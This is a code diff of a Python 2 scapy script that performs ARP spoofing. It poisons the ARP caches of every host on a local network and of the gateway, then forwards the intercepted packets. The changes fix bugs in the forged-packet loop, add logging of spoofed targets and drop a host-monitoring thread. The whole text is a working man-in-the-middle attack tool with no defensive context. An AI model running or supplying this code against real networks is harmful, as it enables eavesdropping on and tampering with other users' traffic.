@@ -7,7 +7,7 @@ from time import sleep
 from scapy.all import *
 from datetime import datetime
 import functions
-#import Queue
+
 
 # except ImportError:
 #
@@ -28,8 +28,8 @@ def handle_Packet(pkt):
     send it forward
     """
     if ARP not in pkt:
-        print pkt.show()
-        #functions.sendPacket(pkt,localAddresses)
+        #print pkt.show()
+        functions.sendPacket(pkt)
     else:
         if pkt[ARP].op == 2: # is-at
 
@@ -39,7 +39,7 @@ def handle_Packet(pkt):
             if address not in localAddresses: #check for duplicates
                 localAddresses.append(address) #add IP address to list of all hosts
                 print 'added',address
-                addressesLock.release()
+            addressesLock.release()
 
 
 
@@ -55,9 +55,9 @@ def arpSpoof(router,localHost):
             for host in localAddresses:
                 if host != router and host != localHost: #check that ip does not match default gateway or local host to not send packets to them
 
-                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host[0])#create arp packets
-                    gatewayPacket=Ether()/ARP(op=2,psrc=host[0],pdst=router)
-
+                    victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#create arp packets
+                    gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
+                    logging.debug('spoofng: '+victimPacket[ARP].pdst)
                     sendp(victimPacket)#send packets
                     sendp(gatewayPacket)
 
@@ -83,10 +83,6 @@ def setup():
     localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) #get addresses of all hosts on network
     logging.debug('scanned network for all active hosts')
     print localAddresses
-
-    monitorThread=Thread(target=monitor_new_hosts)
-    monitorThread.start()
-    logging.debug('created thread for monitoring network for new devices')
 
     arpThread=Thread(target=arpSpoof,args=(defaultGateway,localHost,))
     arpThread.start()
